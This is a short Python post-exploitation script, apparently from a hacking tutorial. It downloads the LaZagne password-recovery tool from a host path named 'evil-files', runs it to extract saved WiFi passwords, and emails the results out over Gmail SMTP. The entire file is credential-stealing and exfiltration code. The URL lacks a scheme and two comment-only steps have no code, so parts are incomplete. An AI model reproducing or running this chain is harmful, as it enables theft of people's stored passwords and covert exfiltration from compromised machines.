#!/usr/bin/env python

# Steps for this Example is as Follows

# 1. Download File on system
# 2. Execute a command that uses this file
# 3. Report result to our email
# 4. Cross Platform

# Post Exploitation Program for Passwords(LaZagne)

import requests
import smtplib
import subprocess

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

# CHANGING DIRECTORY

download("192.168.43.198/evil-files/lazagne.exe")
result = subprocess.check_output("lazagne.exe wifi", shell=True)
send_mail("$Email", "$PASS", result)

# REMOVE INJECTED FILE


